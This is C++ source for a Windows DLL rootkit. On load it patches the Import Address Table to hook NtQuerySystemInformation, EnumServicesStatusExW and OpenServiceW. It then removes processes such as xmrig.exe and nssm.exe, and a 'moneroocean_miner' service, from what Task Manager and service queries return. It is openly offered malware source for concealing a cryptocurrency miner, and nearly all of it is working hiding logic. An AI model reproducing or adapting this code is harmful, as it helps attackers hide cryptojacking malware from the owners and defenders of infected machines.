#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <string>
#include <vector>
#include <mutex>
#include <atomic>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#ifdef _WIN64
#define ARCH_SUFFIX L"64"
#else
#define ARCH_SUFFIX L"32"
#endif

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

#ifndef _MSC_VER
#define __try try
#define __except(x) catch(...)
#endif


std::vector<std::wstring> g_hiddenProcesses = {
    L"ldr.exe",
    L"tao.exe",
	L"nssm.exe",
    L"xmrig.exe"
};

std::vector<std::wstring> g_hiddenServices = {
    L"moneroocean_miner" 
};

std::atomic<bool> g_hookActive(false);
std::mutex g_hookMutex;

static BYTE g_originalBytes[15] = { 0 };
static void* g_trampolineFunc = nullptr;

//func
typedef NTSTATUS(WINAPI* PFN_NT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef BOOL(WINAPI* PFN_ENUM_SERVICES_STATUS_EX_W)(
    SC_HANDLE hSCManager,
    SC_ENUM_TYPE InfoLevel,
    DWORD dwServiceType,
    DWORD dwServiceState,
    LPBYTE lpServices,
    DWORD cbBufSize,
    LPDWORD pcbBytesNeeded,
    LPDWORD lpServicesReturned,
    LPDWORD lpResumeHandle,
    LPCWSTR pszGroupName
    );

typedef SC_HANDLE(WINAPI* PFN_OPEN_SERVICE_W)(
    SC_HANDLE hSCManager,
    LPCWSTR lpServiceName,
    DWORD dwDesiredAccess
    );

PFN_NT_QUERY_SYSTEM_INFORMATION g_origNtQuerySystemInformation = nullptr;
PFN_ENUM_SERVICES_STATUS_EX_W g_origEnumServicesStatusExW = nullptr;
PFN_OPEN_SERVICE_W g_origOpenServiceW = nullptr;

typedef struct _SYSTEM_PROCESS_INFORMATION_EX {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION_EX, * PSYSTEM_PROCESS_INFORMATION_EX;

bool IsProcessNameMatch(const UNICODE_STRING* processName, const std::wstring& targetName) {
    if (!processName || !processName->Buffer || processName->Length == 0) {
        return false;
    }

    size_t processNameLen = processName->Length / sizeof(wchar_t);
    if (processNameLen != targetName.length()) {
        return false;
    }

    return _wcsnicmp(processName->Buffer, targetName.c_str(), processNameLen) == 0;
}

bool ShouldHideProcess(const UNICODE_STRING* processName) {
    if (!processName || !processName->Buffer) {
        return false;
    }

    for (const auto& hiddenProc : g_hiddenProcesses) {
        if (IsProcessNameMatch(processName, hiddenProc)) {
            return true;
        }
    }
    return false;
}

bool ShouldHideService(const std::wstring& serviceName) {
    for (const auto& hiddenSvc : g_hiddenServices) {
        if (_wcsicmp(serviceName.c_str(), hiddenSvc.c_str()) == 0) {
            return true;
        }
    }
    return false;
}

NTSTATUS ProcessHideLogic(PVOID SystemInformation, ULONG SystemInformationLength) {
    try {
        PSYSTEM_PROCESS_INFORMATION_EX pCurrent = (PSYSTEM_PROCESS_INFORMATION_EX)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION_EX pPrevious = nullptr;

        while (pCurrent) {
            PSYSTEM_PROCESS_INFORMATION_EX pNext = nullptr;

            if (pCurrent->NextEntryOffset != 0) {
                pNext = (PSYSTEM_PROCESS_INFORMATION_EX)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

                if ((PUCHAR)pNext >= (PUCHAR)SystemInformation + SystemInformationLength) {
                    break;
                }
            }

            bool shouldHide = ShouldHideProcess(&pCurrent->ImageName);

            if (shouldHide) {
                if (pPrevious) {
                    if (pNext) {
                        pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    }
                    else {
                        pPrevious->NextEntryOffset = 0;
                    }
                }
                else {
                    if (pNext) {
                        SIZE_T bytesToMove = SystemInformationLength - ((PUCHAR)pNext - (PUCHAR)SystemInformation);
                        memmove(pCurrent, pNext, bytesToMove);
                        pNext = pCurrent;
                        continue;
                    }
                    else {
                        ZeroMemory(SystemInformation, sizeof(SYSTEM_PROCESS_INFORMATION_EX));
                        break;
                    }
                }
            }
            else {
                pPrevious = pCurrent;
            }

            if (pCurrent->NextEntryOffset == 0) {
                break;
            }
            pCurrent = pNext;
        }

        return STATUS_SUCCESS;
    }
    catch (...) {
        return STATUS_ACCESS_VIOLATION;
    }
}
//Hook using NTQuerySystemInformation (U can use MinHook for nice results hehe)
NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = g_origNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );

    if (SystemInformationClass != SystemProcessInformation ||
        status != STATUS_SUCCESS ||
        !g_hookActive.load() ||
        !SystemInformation) {
        return status;
    }

    g_hookMutex.lock();
    ProcessHideLogic(SystemInformation, SystemInformationLength);
    g_hookMutex.unlock();

    return status;
}

// Separate function to handle service hiding logic without __try
void FilterHiddenServices(ENUM_SERVICE_STATUS_PROCESSW* services, DWORD* serviceCount) {
    DWORD originalCount = *serviceCount;
    DWORD newCount = 0;

    for (DWORD i = 0; i < originalCount; i++) {
        if (!ShouldHideService(services[i].lpServiceName)) {
            if (newCount != i) {
                memcpy(&services[newCount], &services[i], sizeof(ENUM_SERVICE_STATUS_PROCESSW));
            }
            newCount++;
        }
    }

    *serviceCount = newCount;
}

BOOL WINAPI HookedEnumServicesStatusExW(
    SC_HANDLE hSCManager,
    SC_ENUM_TYPE InfoLevel,
    DWORD dwServiceType,
    DWORD dwServiceState,
    LPBYTE lpServices,
    DWORD cbBufSize,
    LPDWORD pcbBytesNeeded,
    LPDWORD lpServicesReturned,
    LPDWORD lpResumeHandle,
    LPCWSTR pszGroupName
) {
    BOOL result = g_origEnumServicesStatusExW(
        hSCManager,
        InfoLevel,
        dwServiceType,
        dwServiceState,
        lpServices,
        cbBufSize,
        pcbBytesNeeded,
        lpServicesReturned,
        lpResumeHandle,
        pszGroupName
    );

    if (!result || !lpServices || !lpServicesReturned || *lpServicesReturned == 0) {
        return result;
    }

    try {
        if (InfoLevel == SC_ENUM_PROCESS_INFO) {
            g_hookMutex.lock();
            FilterHiddenServices((ENUM_SERVICE_STATUS_PROCESSW*)lpServices, lpServicesReturned);
            g_hookMutex.unlock();
        }
    }
    catch (...) {
        // If something goes wrong, return original result
    }

    return result;
}

SC_HANDLE WINAPI HookedOpenServiceW(
    SC_HANDLE hSCManager,
    LPCWSTR lpServiceName,
    DWORD dwDesiredAccess
) {
    if (lpServiceName && ShouldHideService(lpServiceName)) {
        SetLastError(ERROR_SERVICE_DOES_NOT_EXIST);
        return NULL;
    }

    return g_origOpenServiceW(hSCManager, lpServiceName, dwDesiredAccess);
}
//IAT Hooking 
bool InstallIATHook() {
    bool hookedNtQuery = false;
    bool hookedEnumServices = false;
    bool hookedOpenService = false;

    try {
        HMODULE hModule = GetModuleHandleW(NULL);
        if (!hModule) {
            return false;
        }

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            return false;
        }

        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            return false;
        }

        IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir.Size == 0) {
            return false;
        }

        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + importDir.VirtualAddress);

        while (importDesc->Name != 0) {
            const char* dllName = (const char*)((BYTE*)hModule + importDesc->Name);

            // Hook ntdll functions
            if (_stricmp(dllName, "ntdll.dll") == 0) {
                PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
                PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->OriginalFirstThunk);

                while (origThunk->u1.AddressOfData != 0) {
                    if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + origThunk->u1.AddressOfData);

                        if (strcmp((char*)importByName->Name, "NtQuerySystemInformation") == 0) {
                            g_origNtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)thunk->u1.Function;

                            DWORD oldProtect;
                            if (VirtualProtect(&thunk->u1.Function, sizeof(PVOID), PAGE_READWRITE, &oldProtect)) {
                                thunk->u1.Function = (ULONG_PTR)HookedNtQuerySystemInformation;
                                DWORD temp;
                                VirtualProtect(&thunk->u1.Function, sizeof(PVOID), oldProtect, &temp);
                                hookedNtQuery = true;
                            }
                        }
                    }

                    origThunk++;
                    thunk++;
                }
            }
            // Hook advapi32 functions (for services) currently not working but this doesn't stop the dll.
            else if (_stricmp(dllName, "advapi32.dll") == 0) {
                PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
                PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->OriginalFirstThunk);

                while (origThunk->u1.AddressOfData != 0) {
                    if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + origThunk->u1.AddressOfData);

                        if (strcmp((char*)importByName->Name, "EnumServicesStatusExW") == 0) {
                            g_origEnumServicesStatusExW = (PFN_ENUM_SERVICES_STATUS_EX_W)thunk->u1.Function;

                            DWORD oldProtect;
                            if (VirtualProtect(&thunk->u1.Function, sizeof(PVOID), PAGE_READWRITE, &oldProtect)) {
                                thunk->u1.Function = (ULONG_PTR)HookedEnumServicesStatusExW;
                                DWORD temp;
                                VirtualProtect(&thunk->u1.Function, sizeof(PVOID), oldProtect, &temp);
                                hookedEnumServices = true;
                            }
                        }
                        else if (strcmp((char*)importByName->Name, "OpenServiceW") == 0) {
                            g_origOpenServiceW = (PFN_OPEN_SERVICE_W)thunk->u1.Function;

                            DWORD oldProtect;
                            if (VirtualProtect(&thunk->u1.Function, sizeof(PVOID), PAGE_READWRITE, &oldProtect)) {
                                thunk->u1.Function = (ULONG_PTR)HookedOpenServiceW;
                                DWORD temp;
                                VirtualProtect(&thunk->u1.Function, sizeof(PVOID), oldProtect, &temp);
                                hookedOpenService = true;
                            }
                        }
                    }

                    origThunk++;
                    thunk++;
                }
            }

            importDesc++;
        }
    }
    catch (...) {
        return false;
    }

    return hookedNtQuery || hookedEnumServices || hookedOpenService;
}

bool SetupDirectCall() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    HMODULE hAdvapi32 = GetModuleHandleW(L"advapi32.dll");

    if (hNtdll) {
        g_origNtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)
            GetProcAddress(hNtdll, "NtQuerySystemInformation");
    }

    if (hAdvapi32) {
        g_origEnumServicesStatusExW = (PFN_ENUM_SERVICES_STATUS_EX_W)
            GetProcAddress(hAdvapi32, "EnumServicesStatusExW");
        g_origOpenServiceW = (PFN_OPEN_SERVICE_W)
            GetProcAddress(hAdvapi32, "OpenServiceW");
    }

    return (g_origNtQuerySystemInformation != nullptr);
}

void UninstallHook() {
    g_hookActive.store(false);
    Sleep(100);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);

        if (InstallIATHook()) {
            g_hookActive.store(true);
        }
        else if (SetupDirectCall()) {
            g_hookActive.store(true);
        }
        break;

    case DLL_PROCESS_DETACH:
        UninstallHook();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}